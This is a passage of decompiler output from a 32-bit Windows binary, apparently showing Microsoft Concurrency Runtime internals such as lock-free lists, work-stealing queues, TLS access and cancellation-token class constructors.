// 4383D9: using guessed type char var_24[8];

//----- (00438535) --------------------------------------------------------
void __thiscall sub_438535(volatile signed __int32 *this, int a2, char a3)
{
  sub_43858E((int)(this + 20), (_DWORD *)(a2 + 92));
  *(_BYTE *)(a2 + 77) = 1;
  if ( a3 )
    _InterlockedDecrement(this + 25);
}

//----- (0043855F) --------------------------------------------------------
int __thiscall sub_43855F(int *this, _DWORD *a2)
{
  int result; // eax

  result = *this;
  if ( *this )
  {
    a2[1] = *(_DWORD *)(result + 4);
    *a2 = *this;
    **(_DWORD **)(*this + 4) = a2;
    result = *this;
    *(_DWORD *)(*this + 4) = a2;
  }
  else
  {
    a2[1] = a2;
    *a2 = a2;
  }
  *this = (int)a2;
  return result;
}

//----- (0043858E) --------------------------------------------------------
void __thiscall sub_43858E(int this, _DWORD *a2)
{
  sub_42E793((volatile signed __int32 *)(this + 4));
  sub_43855F((int *)this, a2);
  sub_42E8AD((volatile signed __int32 *)(this + 4));
}

//----- (004385C2) --------------------------------------------------------
void __thiscall sub_4385C2(int this, signed __int32 a2)
{
  signed __int32 i; // edx
  signed __int32 v4; // eax
  int v5; // eax
  volatile signed __int32 *v6; // esi
  signed __int32 j; // edx
  signed __int32 v8; // eax

  _InterlockedIncrement((volatile signed __int32 *)(this + 112));
  for ( i = *(_DWORD *)(this + 104); i == -1 || a2 <= i; i = v4 )
  {
    v4 = _InterlockedCompareExchange((volatile signed __int32 *)(this + 104), a2, i);
    if ( v4 == i )
    {
      if ( *(_DWORD *)(this + 116) )
        v5 = -1;
      else
        v5 = a2;
      sub_438A95((_DWORD *)this, v5);
      break;
    }
  }
  v6 = (volatile signed __int32 *)(this + 108);
  for ( j = *v6; j == -1 || a2 >= j; j = v8 )
  {
    v8 = _InterlockedCompareExchange(v6, a2, j);
    if ( v8 == j )
      break;
  }
}

//----- (00438629) --------------------------------------------------------
signed __int32 __thiscall sub_438629(volatile signed __int32 *this, signed __int32 a2)
{
  signed __int32 v3; // ebx

  _InterlockedCompareExchange(this + 26, -1, a2);
  sub_438CEC((int)this);
  v3 = 1 - _InterlockedExchangeAdd(this + 28, 0xFFFFFFFF);
  LOBYTE(v3) = -(v3 != 0);
  return v3 + 1;
}

//----- (00438659) --------------------------------------------------------
void __thiscall sub_438659(int this, int a2)
{
  int v2; // edi
  int v3; // esi
  int v4; // edx
  int v5; // eax
  int v6; // ecx
  volatile signed __int32 *v7; // [esp+14h] [ebp-14h]

  v2 = this + 80;
  v7 = (volatile signed __int32 *)(this + 84);
  sub_42E763((volatile signed __int32 *)(this + 84));
  if ( *(_DWORD *)v2 )
  {
    v3 = *(_DWORD *)(*(_DWORD *)v2 + 4);
    if ( v3 )
    {
      while ( 1 )
      {
        if ( *(_DWORD *)(v3 + 24) )
          goto LABEL_13;
        v4 = *(_DWORD *)(v3 - 44);
        if ( v4 == a2 )
          goto LABEL_12;
        if ( a2 )
          break;
        v5 = (16 * *(_DWORD *)(v4 + 4)) >> 4;
        if ( v5 != -1 )
          goto LABEL_10;
LABEL_13:
        if ( v3 != *(_DWORD *)v2 )
        {
          v3 = *(_DWORD *)(v3 + 4);
          if ( v3 )
            continue;
        }
        goto LABEL_15;
      }
      v6 = (16 * *(_DWORD *)(a2 + 4)) >> 4;
      if ( v6 == -1 )
        goto LABEL_13;
      v5 = (16 * *(_DWORD *)(v4 + 4)) >> 4;
      if ( v5 <= v6 )
        goto LABEL_13;
LABEL_10:
      if ( *(_DWORD *)(this + 60) != -1 && !sub_438B32((_DWORD *)this, v4, v5) )
        goto LABEL_13;
LABEL_12:
      _InterlockedExchange((volatile __int32 *)(v3 + 24), 1);
      sub_4385C2(v3 - 92, -999);
      sub_438659(0);
      goto LABEL_13;
    }
  }
LABEL_15:
  sub_42E8A9(v7);
}

//----- (0043874E) --------------------------------------------------------
char __cdecl sub_43874E(int a1)
{
  char result; // al

  result = sub_436498(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    sub_4388AE(*(_DWORD **)(a1 + 16));
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0043875A) --------------------------------------------------------
char __thiscall sub_43875A(int *this, _DWORD *a2)
{
  int v2; // edi

  v2 = *(_DWORD *)(*(_DWORD *)(*this + 12) + 4 * this[1]);
  if ( v2 == 1 || _InterlockedExchange((volatile __int32 *)(*(_DWORD *)(*this + 12) + 4 * this[1]), 1) != v2 )
  {
    sub_4388D0(*this);
    return 0;
  }
  else
  {
    if ( a2 )
      *a2 = v2;
    return 1;
  }
}

//----- (004387A1) --------------------------------------------------------
int __thiscall sub_4387A1(int this)
{
  int v2; // ebx
  int v3; // eax

  sub_438D74((int *)this);
  v2 = *(_DWORD *)(this + 8);
  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  return sub_43914D(2, 4u, v3, v2);
}

//----- (004387DC) --------------------------------------------------------
void __thiscall sub_4387DC(int *this)
{
  int *v1; // edi
  int v2; // esi
  int v3; // [esp+8h] [ebp-4h] BYREF

  v3 = 0;
  v1 = this + 32;
  while ( 1 )
  {
    v2 = sub_438C31(v1, &v3);
    if ( !v2 )
      break;
    do
    {
      sub_439F90(*(volatile signed __int32 **)(v2 + 8));
      v2 = *(_DWORD *)v2;
    }
    while ( v2 );
    ++v3;
  }
  sub_4380AE(v1);
}

//----- (0043881B) --------------------------------------------------------
BOOL sub_43881B()
{
  return sub_430192(dword_4927F0, 0);
}

//----- (0043882B) --------------------------------------------------------
int __thiscall sub_43882B(int this)
{
  struct _SINGLE_LIST_ENTRY *v2; // eax
  PSLIST_ENTRY v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  int result; // eax

  v2 = sub_4401A5(*(union _SLIST_HEADER **)(this + 24));
  *(_DWORD *)(this + 32) = v2;
  if ( !v2 )
  {
    v3 = InterlockedPopEntrySList((PSLIST_HEADER)(*(_DWORD *)(this + 24) + 88));
    v4 = 0;
    if ( v3 )
    {
      *(_DWORD *)(this + 32) = v3 - 6;
      if ( v3 != (PSLIST_ENTRY)24 )
      {
        sub_441623((volatile __int32 *)&v3[-6]);
        v4 = *(_DWORD **)(this + 32);
LABEL_9:
        sub_4383D9((_DWORD *)(*(_DWORD *)(this + 24) + 88), (signed __int32)v4);
        goto LABEL_10;
      }
    }
    else
    {
      *(_DWORD *)(this + 32) = 0;
    }
    v5 = operator new(0x74u);
    if ( v5 )
      v4 = sub_4415B5(v5);
    *(_DWORD *)(this + 32) = v4;
    goto LABEL_9;
  }
LABEL_10:
  result = *(_DWORD *)(this + 32);
  *(_DWORD *)(result + 72) = this;
  return result;
}

//----- (004388AE) --------------------------------------------------------
void **__stdcall sub_4388AE(_DWORD *a1)
{
  void **v2; // ecx
  void **result; // eax

  while ( a1 )
  {
    v2 = (void **)(a1 - 6);
    a1 = (_DWORD *)*a1;
    if ( v2 )
      result = sub_4383AD(v2, 1);
  }
  return result;
}

//----- (004388D0) --------------------------------------------------------
int __thiscall sub_4388D0(int this)
{
  int result; // eax

  result = _InterlockedExchangeAdd((volatile signed __int32 *)(this + 20), 0xFFFFFFFF);
  if ( !result )
    return sub_436B3C(
             (int (__cdecl **)(int))(this + 28),
             (int (__cdecl *)(int))sub_438F91,
             (int (__cdecl *)(int))this,
             *(_DWORD *)this);
  return result;
}

//----- (004388EB) --------------------------------------------------------
char __thiscall sub_4388EB(int *this)
{
  char result; // al
  int v3; // esi
  int v4; // esi
  bool v5; // zf
  _DWORD *v6; // esi
  _DWORD v7[5]; // [esp+10h] [ebp-3Ch] BYREF
  char *v8; // [esp+24h] [ebp-28h]
  int v9; // [esp+28h] [ebp-24h]
  int v10; // [esp+2Ch] [ebp-20h]
  bool v11; // [esp+32h] [ebp-1Ah]
  char v12; // [esp+33h] [ebp-19h]
  CPPEH_RECORD ms_exc; // [esp+34h] [ebp-18h]

  v7[4] = this;
  if ( this[25] )
  {
    v7[2] = 0;
    v7[3] = sub_43055D;
    do
      sub_42E97E(v7);
    while ( this[25] );
  }
  if ( this[33] > 0 )
    sub_4387DC(this);
  if ( !this[20] )
    return sub_42E85C(this + 21);
  result = 0;
  v11 = 0;
  while ( !result )
  {
    v12 = 1;
    sub_42E793(this + 21);
    ms_exc.registration.TryLevel = 0;
    v12 = 1;
    v3 = this[20];
    if ( v3 )
      v4 = *(_DWORD *)(v3 + 4);
    else
      v4 = 0;
    while ( 1 )
    {
      v5 = v4 == 0;
      if ( !v4 )
        break;
      if ( v4 == this[20] )
        v10 = 0;
      else
        v10 = *(_DWORD *)(v4 + 4);
      v9 = v4 - 92;
      v8 = sub_439D24(*(char **)(v4 - 92 + 48));
      if ( !sub_42EA44((volatile signed __int32 *)v8 + 1) )
      {
        sub_42E8AD(this + 21);
        v12 = 0;
        sub_430125(1u);
        v5 = v4 == 0;
        break;
      }
      ms_exc.registration.TryLevel = 1;
      v6 = (_DWORD *)(v9 + 92);
      sub_438E19(this + 20, (_DWORD **)(v9 + 92));
      *(_BYTE *)(v9 + 77) = 0;
      sub_43855F((int *)v8, v6);
      ms_exc.registration.TryLevel = 0;
      v4 = v10;
      sub_42E8AD((volatile signed __int32 *)v8 + 1);
    }
    v11 = v5;
    ms_exc.registration.TryLevel = -2;
    if ( v12 )
      sub_42E8AD(this + 21);
    result = v11;
  }
  return result;
}

//----- (00438A2D) --------------------------------------------------------
int __thiscall sub_438A2D(_DWORD *this)
{
  int result; // eax

  result = this[3] + 1;
  this[3] = result;
  return result;
}

//----- (00438A35) --------------------------------------------------------
int __thiscall sub_438A35(_DWORD *this)
{
  int v1; // eax
  int result; // eax

  v1 = this[4];
  ++this[3];
  result = v1 + 1;
  this[4] = result;
  return result;
}

//----- (00438A40) --------------------------------------------------------
int __thiscall sub_438A40(_DWORD *this)
{
  int result; // eax

  result = this[3] - 1;
  this[3] = result;
  return result;
}

//----- (00438A48) --------------------------------------------------------
int __thiscall sub_438A48(_DWORD *this)
{
  int v1; // eax
  int result; // eax

  v1 = this[4];
  --this[3];
  result = v1 - 1;
  this[4] = result;
  return result;
}

//----- (00438A53) --------------------------------------------------------
char __thiscall sub_438A53(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // eax
  _DWORD *v5; // eax

  v4 = sub_4364AB((int)a2, *this);
  v5 = sub_438DCB(this, a2, v4);
  if ( !v5 )
    return 0;
  if ( a3 )
    *a3 = v5[2];
  sub_42CF7C(v5);
  return 1;
}

//----- (00438A95) --------------------------------------------------------
_DWORD *__thiscall sub_438A95(_DWORD *this, int a2)
{
  int v3; // esi
  _DWORD *result; // eax
  int v5; // edi
  int v6; // ecx

  v3 = 0;
  result = this + 35;
  v5 = this[35];
  if ( v5 > 0 )
  {
    do
    {
      v6 = sub_438333(result, v3);
      if ( *(_DWORD *)(v6 + 4) >= a2 && (this[15] == -1 || this[15] <= a2) )
        _InterlockedIncrement((volatile signed __int32 *)v6);
      ++v3;
      result = this + 35;
    }
    while ( v3 < v5 );
  }
  return result;
}

//----- (00438ADD) --------------------------------------------------------
int __thiscall sub_438ADD(_DWORD *this)
{
  if ( this[4] )
    return 2;
  else
    return this[3] != 0;
}

//----- (00438AF1) --------------------------------------------------------
int __thiscall sub_438AF1(_DWORD *this)
{
  return this[2];
}

//----- (00438AF5) --------------------------------------------------------
int __thiscall sub_438AF5(_DWORD *this)
{
  return this[31];
}

//----- (00438AF9) --------------------------------------------------------
int __thiscall sub_438AF9(_DWORD *this)
{
  int v1; // eax

  v1 = this[6];
  if ( v1 )
    return *(_DWORD *)(v1 + 256);
  else
    return 0;
}

//----- (00438B0A) --------------------------------------------------------
int __thiscall sub_438B0A(_DWORD *this)
{
  int v1; // edi

  v1 = this[6];
  if ( v1 )
    return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v1 + 256) + 4))(*(_DWORD *)(v1 + 256));
  else
    return -1;
}

//----- (00438B32) --------------------------------------------------------
bool __thiscall sub_438B32(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  int v5; // esi
  int v6; // eax
  bool v8; // zf

  if ( (int)this[28] <= 0 || this[26] > a3 )
    return 0;
  if ( this[15] != -1 && this[26] < this[15] )
  {
    v4 = this[13];
    v5 = a2;
    if ( a2 == v4 && a3 == (16 * *(_DWORD *)(v4 + 4)) >> 4 )
    {
      v6 = this[14];
LABEL_8:
      if ( v6 != 2 )
        return *(_DWORD *)(v6 + 8) != 0;
    }
    else
    {
      do
      {
        if ( v5 == this[12] )
          break;
        if ( (16 * *(_DWORD *)(v5 + 4)) >> 4 == a3 )
          break;
        v5 = sub_4391EC((_DWORD *)v5);
      }
      while ( v5 );
      while ( v5 && v5 != this[12] )
      {
        if ( sub_441417((_DWORD *)v5, 0) )
        {
          if ( v5 == this[12] )
            return 0;
          v6 = sub_441417((_DWORD *)v5, 0);
          goto LABEL_8;
        }
        if ( ((*(int *)(v5 + 4) >> 28) & 1) != 0 )
          v8 = (*(_BYTE *)(v5 + 24) & 3) == 0;
        else
          v8 = !sub_439E46((_DWORD *)v5);
        if ( !v8 )
          return 1;
        v5 = sub_4391EC((_DWORD *)v5);
      }
    }
    return 0;
  }
  return 1;
}
// 438BF5: conditional instruction was optimized away because esi.4!=0

//----- (00438C0E) --------------------------------------------------------
int __thiscall sub_438C0E(int this, int a2)
{
  sub_4304D3((volatile __int32 *)(this + 112));
  *(_DWORD *)(this + 72) = a2;
  return sub_430514((_DWORD *)(this + 112));
}

//----- (00438C31) --------------------------------------------------------
int __thiscall sub_438C31(int *this, int *a2)
{
  int v2; // edx
  _DWORD *i; // eax

  v2 = *a2;
  if ( *a2 >= *this )
    return 0;
  for ( i = (_DWORD *)(this[2] + 4 * v2); !*i; ++i )
  {
    if ( ++v2 >= *this )
      return 0;
  }
  *a2 = v2;
  return *(_DWORD *)(this[2] + 4 * v2);
}

//----- (00438C62) --------------------------------------------------------
int __thiscall sub_438C62(__int32 *this)
{
  volatile __int32 *v1; // edi
  __int32 v2; // edx
  int v3; // esi
  int v4; // ebx

  v1 = this + 1;
  do
  {
    v2 = *v1 - 1;
    _InterlockedExchange(v1, v2);
    if ( *this > v2 )
    {
      *v1 = v2 + 1;
      return sub_439043(this);
    }
    v3 = v2 & this[2];
    v4 = *(_DWORD *)(this[7] + 4 * v3);
  }
  while ( !v4 );
  if ( (v4 & 1) == 0 )
    return v4;
  v4 &= ~1u;
  if ( sub_43875A((int *)(this[8] + 8 * v3), 0) )
    return v4;
  else
    return 1;
}

//----- (00438CB3) --------------------------------------------------------
void *__thiscall sub_438CB3(_DWORD *this)
{
  void *v2; // esi

  v2 = (void *)this[9];
  sub_430192(dword_4927F0, v2);
  this[9] = 0;
  return v2;
}

//----- (00438CD1) --------------------------------------------------------
BOOL __thiscall sub_438CD1(_DWORD *lpTlsValue, int a2)
{
  lpTlsValue[9] = a2;
  return sub_430192(dword_4927F0, lpTlsValue);
}

//----- (00438CEC) --------------------------------------------------------
char __thiscall sub_438CEC(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // esi
  bool v5; // zf
  signed __int32 i; // edx
  volatile signed __int32 *v8; // [esp+Ch] [ebp-4h]

  v8 = (volatile signed __int32 *)(this + 108);
  LOBYTE(v2) = _InterlockedExchange((volatile __int32 *)(this + 108), -1);
  v3 = *(_DWORD *)(this + 52);
  v4 = *(_DWORD *)(this + 116) != 0 ? -999 : -1;
  while ( v3 && v3 != *(_DWORD *)(this + 48) )
  {
    v2 = *(int *)(v3 + 4) >> 28;
    if ( (v2 & 1) != 0 )
    {
      v5 = (*(_BYTE *)(v3 + 24) & 3) == 0;
    }
    else
    {
      LOBYTE(v2) = sub_439E46((_DWORD *)v3);
      v5 = (_BYTE)v2 == 0;
    }
    if ( !v5 )
    {
      v4 = (16 * *(_DWORD *)(v3 + 4)) >> 4;
      break;
    }
    v2 = sub_4391EC((_DWORD *)v3);
    v3 = v2;
  }
  for ( i = -1; i == -1 || v4 >= i; i = v2 )
  {
    v2 = _InterlockedCompareExchange(v8, v4, i);
    if ( v2 == i )
      break;
  }
  return v2;
}

//----- (00438D6F) --------------------------------------------------------
void __thiscall sub_438D6F(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 25);
}

//----- (00438D74) --------------------------------------------------------
char __thiscall sub_438D74(int *this)
{
  int v2; // esi

  v2 = this[8];
  if ( v2 )
  {
    this[8] = 0;
    if ( *(_DWORD *)(v2 + 80) <= *(_DWORD *)(v2 + 76) )
    {
      if ( *(_DWORD *)(v2 + 112) )
        sub_438C0E(v2, 0);
      else
        *(_DWORD *)(v2 + 72) = 0;
      sub_438E47((PSLIST_HEADER)(this[6] + 88), (struct _SINGLE_LIST_ENTRY *)v2, *(_DWORD *)(v2 + 68), 1);
    }
    else
    {
      sub_438C0E(v2, 0);
      sub_4400D7((_DWORD *)this[6], v2);
    }
  }
  return sub_4388EB(this);
}

//----- (00438DCB) --------------------------------------------------------
_DWORD *__thiscall sub_438DCB(_DWORD *this, _DWORD *a2, int a3)
{
  int v3; // edi
  _DWORD *v4; // esi
  _DWORD *v5; // edx
  int v6; // eax

  v3 = this[2];
  v4 = 0;
  v5 = *(_DWORD **)(v3 + 4 * a3);
  if ( !v5 )
    return 0;
  while ( 1 )
  {
    v6 = *v5;
    if ( v5[1] == *a2 )
      break;
    v4 = v5;
    v5 = (_DWORD *)*v5;
    if ( !v6 )
      return 0;
  }
  if ( v4 )
    *v4 = v6;
  else
    *(_DWORD *)(v3 + 4 * a3) = v6;
  --this[1];
  return v5;
}

//----- (00438E19) --------------------------------------------------------
_DWORD *__thiscall sub_438E19(_DWORD *this, _DWORD **a2)
{
  _DWORD *result; // eax

  *a2[1] = *a2;
  (*a2)[1] = a2[1];
  result = (_DWORD *)*this;
  if ( a2 == (_DWORD **)*this )
  {
    if ( result == (_DWORD *)result[1] )
      result = 0;
    else
      result = (_DWORD *)*result;
    *this = result;
  }
  return result;
}

//----- (00438E47) --------------------------------------------------------
char __thiscall sub_438E47(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 6;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_436498(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_436B3C(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_43874E,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (00438F38) --------------------------------------------------------
void __thiscall sub_438F38(int this, _DWORD **a2)
{
  sub_42E793((volatile signed __int32 *)(this + 4));
  sub_438E19((_DWORD *)this, a2);
  sub_42E8AD((volatile signed __int32 *)(this + 4));
}

//----- (00438F6C) --------------------------------------------------------
void __thiscall sub_438F6C(void *this, int a2)
{
  sub_438F38((int)this + 80, (_DWORD **)(a2 + 92));
}

//----- (00438F82) --------------------------------------------------------
BOOL __thiscall sub_438F82(LPVOID lpTlsValue)
{
  return sub_430192(dword_4927F0, lpTlsValue);
}

//----- (00438F91) --------------------------------------------------------
void __cdecl sub_438F91(void **Block)
{
  if ( Block )
  {
    sub_4382C0(Block);
    sub_42CF7C(Block);
  }
}

//----- (00438FB5) --------------------------------------------------------
void __usercall sub_438FB5(int a1@<ecx>, int a2@<esi>)
{
  int *v2; // ebx
  int *v3; // edi
  int v4; // esi
  _DWORD *v5; // edi
  int v6; // [esp-4h] [ebp-14h]
  int v7; // [esp+0h] [ebp-10h]
  int v8; // [esp+8h] [ebp-8h] BYREF
  int v9; // [esp+Ch] [ebp-4h] BYREF

  v9 = 0;
  v2 = (int *)(a1 + 128);
  v3 = (int *)sub_438C31((int *)(a1 + 128), &v9);
  if ( v3 )
  {
    v6 = a2;
    do
    {
      v4 = *v3;
      if ( !*v3 )
      {
        ++v9;
        v4 = sub_438C31(v2, &v9);
      }
      if ( sub_439E51((_DWORD *)v3[2]) )
      {
        v5 = (_DWORD *)v3[2];
        v8 = sub_439EA8(v5);
        sub_438A53((unsigned int *)v2, &v8, 0);
        if ( v5 )
        {
          sub_439490(v6, v7);
          sub_42CF7C(v5);
        }
      }
      v3 = (int *)v4;
    }
    while ( v4 );
  }
}
// 438FB5: could not find valid save-restore pair for esi
// 43901A: variable 'v6' is possibly undefined
// 43901A: variable 'v7' is possibly undefined
// 439490: using guessed type _DWORD __cdecl sub_439490(_DWORD, _DWORD);

//----- (00439037) --------------------------------------------------------
int __thiscall sub_439037(
        volatile __int32 **this,
        unsigned __int8 (__cdecl *a2)(int, int),
        int a3,
        int (__cdecl *a4)(int, int))
{
  return sub_44179A(this[8], a2, a3, a4);
}

//----- (00439043) --------------------------------------------------------
int __thiscall sub_439043(void *this)
{
  int v2; // edi
  int v3; // ebx
  int v4; // edx
  int v5; // ecx
  int v7; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+14h] [ebp-14h]
  volatile __int32 *v9; // [esp+18h] [ebp-10h]
  int v10; // [esp+24h] [ebp-4h]

  v9 = (volatile __int32 *)*((_DWORD *)this + 4);
  sub_4304D3(v9);
  v2 = *((_DWORD *)this + 1) - 1;
  v7 = 0;
  v8 = 0;
  v3 = 0;
  *((_DWORD *)this + 1) = v2;
  v10 = 0;
  if ( *(_DWORD *)this > v2 )
  {
    *((_DWORD *)this + 1) = v2 + 1;
  }
  else
  {
    v4 = v2 & *((_DWORD *)this + 2);
    v5 = *((_DWORD *)this + 8);
    v3 = *(_DWORD *)(*((_DWORD *)this + 7) + 4 * v4);
    v7 = *(_DWORD *)(v5 + 8 * v4);
    v8 = *(_DWORD *)(v5 + 8 * v4 + 4);
  }
  if ( *(_DWORD *)this >= v2 )
  {
    *((_DWORD *)this + 3) += *(_DWORD *)this;
    *(_DWORD *)this = 0;
    *((_DWORD *)this + 1) = 0;
    *((_DWORD *)this + 6) = 0;
    *((_BYTE *)this + 20) = 0;
  }
  if ( (v3 & 1) != 0 )
  {
    v3 &= ~1u;
    if ( !sub_43875A(&v7, 0) )
      v3 = 1;
  }
  v10 = 2;
  sub_430514(v9);
  return v3;
}

//----- (004390DC) --------------------------------------------------------
int __cdecl sub_4390DC(char a1, char a2, int a3, int a4)
{
  int result; // eax
  _DWORD v5[16]; // [esp+4h] [ebp-40h] BYREF

  if ( dword_492850 )
  {
    memset((char *)v5 + 2, 0, 0x3Eu);
    v5[11] = 0x20000;
    LOWORD(v5[0]) = 64;
    LOBYTE(v5[1]) = a1;
    BYTE1(v5[1]) = a2;
    v5[6] = dword_471464[0];
    v5[7] = dword_471464[1];
    v5[8] = dword_471464[2];
    v5[9] = dword_471464[3];
    v5[13] = a3;
    v5[14] = a4;
    return sub_43C82A(dword_492850, dword_492848, dword_49284C, (int)v5);
  }
  return result;
}
// 471464: using guessed type _DWORD dword_471464[4];
// 492848: using guessed type int dword_492848;
// 49284C: using guessed type int dword_49284C;

//----- (0043914D) --------------------------------------------------------
int __stdcall sub_43914D(char a1, unsigned __int8 a2, int a3, int a4)
{
  int result; // eax

  if ( a2 <= (unsigned __int8)byte_492844 )
  {
    result = dword_492840;
    if ( (dword_492840 & 2) != 0 )
      return sub_4390DC(a1, a2, a3, a4);
  }
  return result;
}
// 492840: using guessed type int dword_492840;
// 492844: using guessed type char byte_492844;

//----- (0043917A) --------------------------------------------------------
int __thiscall sub_43917A(__int32 *this, int a2)
{
  __int32 v2; // esi
  __int32 v4; // ebx

  v2 = a2 - this[3];
  if ( v2 == this[1] - 1 )
    return sub_438C62(this);
  if ( v2 >= this[1] || v2 < *this )
    return 0;
  v4 = _InterlockedExchange((volatile __int32 *)(this[7] + 4 * (v2 & this[2])), 0);
  if ( (v4 & 1) == 0 )
    return v4;
  v4 &= ~1u;
  if ( sub_43875A((int *)(this[8] + 8 * (v2 & this[2])), 0) )
    return v4;
  else
    return 1;
}

//----- (004391DD) --------------------------------------------------------
int __thiscall sub_4391DD(_DWORD *this, int a2)
{
  return sub_43917A((__int32 *)(this[8] + 76), a2);
}

//----- (004391EC) --------------------------------------------------------
int __thiscall sub_4391EC(_DWORD *this)
{
  if ( (this[1] & 0xFFFFFFF) == 0xFFFFFFF )
    return 0;
  else
    return *this;
}

//----- (00439200) --------------------------------------------------------
int __thiscall sub_439200(void *this, _Mtx_t *a2, int a3)
{
  int result; // eax
  int v5; // eax

  for ( result = a3; !*(_BYTE *)(a3 + 100); result = a3 )
  {
    v5 = sub_42C9F5((int)this, *a2);
    std::_Check_C_return(v5);
  }
  return result;
}

//----- (0043925B) --------------------------------------------------------
int __thiscall sub_43925B(int this, int a2, int a3, int a4)
{
  int result; // eax

  sub_439286((char *)this, a4);
  *(_DWORD *)(this + 108) = a2;
  *(_DWORD *)(this + 112) = a3;
  result = this;
  *(_DWORD *)this = &Concurrency::details::CancellationTokenRegistration_TaskProc::`vftable';
  return result;
}
// 471184: using guessed type void *Concurrency::details::CancellationTokenRegistration_TaskProc::`vftable';

//----- (00439286) --------------------------------------------------------
char *__thiscall sub_439286(char *this, int a2)
{
  *(_DWORD *)this = &Concurrency::details::_RefCounter::`vftable';
  *((_DWORD *)this + 1) = a2;
  *(_DWORD *)this = &Concurrency::details::_CancellationTokenRegistration::`vftable';
  *((_DWORD *)this + 2) = 3;
  sub_42C9F0(this + 12);
  _Mtx_init_in_situ((_Mtx_t)(this + 52), 2);
  this[100] = 0;
  *((_DWORD *)this + 26) = 0;
  return this;
}
// 42C9F0: using guessed type _DWORD __cdecl sub_42C9F0(_DWORD);
// 471168: using guessed type void *Concurrency::details::_RefCounter::`vftable';
// 471174: using guessed type void *Concurrency::details::_CancellationTokenRegistration::`vftable';

//----- (004392CF) --------------------------------------------------------
std::exception *__thiscall sub_4392CF(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::details::_Interruption_exception::`vftable';
  return this;
}
// 47115C: using guessed type void *Concurrency::details::_Interruption_exception::`vftable';

//----- (004392FB) --------------------------------------------------------
volatile __int32 *__thiscall sub_4392FB(volatile __int32 *this, int a2, char a3)
{
  int v4; // eax
  int v5; // eax
  volatile signed __int32 *v6; // edx
  signed __int32 v7; // esi
  signed __int32 i; // eax
  _DWORD *v9; // eax
  int v10; // eax

  *((_DWORD *)this + 1) |= 0xFFFFFFFu;
  *((_DWORD *)this + 2) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 5) = 0x80000000;
  *((_DWORD *)this + 6) = 0;
  *((_DWORD *)this + 14) = 0;
  sub_42ED37((_DWORD *)this + 15);
  *((_DWORD *)this + 25) = *(_DWORD *)(a2 + 100);
  *((_DWORD *)this + 27) = 0;
  *((_DWORD *)this + 30) = 0;
  *((_DWORD *)this + 33) = 0;
  *((_DWORD *)this + 34) = 0;
  v4 = sub_42E59B();
  *((_DWORD *)this + 3) = v4;
  *this = *(_DWORD *)(v4 + 52);
  v5 = *(_DWORD *)(a2 + 8);
  *((_DWORD *)this + 2) = v5;
  if ( v5 && v5 != 2 )
    _InterlockedIncrement((volatile signed __int32 *)(v5 + 4));
  sub_439D73(this);
  sub_42F5DA(this + 15);
  if ( a3 )
  {
    v6 = (volatile signed __int32 *)(*((_DWORD *)this + 25) + 104);
    v7 = *v6;
    *((_DWORD *)this + 26) = *v6;
    for ( i = _InterlockedCompareExchange(v6, (signed __int32)this, v7);
          i != v7;
          i = _InterlockedCompareExchange(
                (volatile signed __int32 *)(*((_DWORD *)this + 25) + 104),
                (signed __int32)this,
                i) )
    {
      *((_DWORD *)this + 26) = i;
      v7 = i;
    }
  }
  else
  {
    *((_DWORD *)this + 30) |= 1u;
    *((_DWORD *)this + 26) = 0;
  }
  v9 = sub_4359BC();
  v10 = sub_43967D(v9);
  *((_DWORD *)this + 1) &= 0xFFFFFFFu;
  *((_DWORD *)this + 32) = v10;
  return this;
}
// 42E59B: using guessed type int sub_42E59B(void);

//----- (004393DC) --------------------------------------------------------
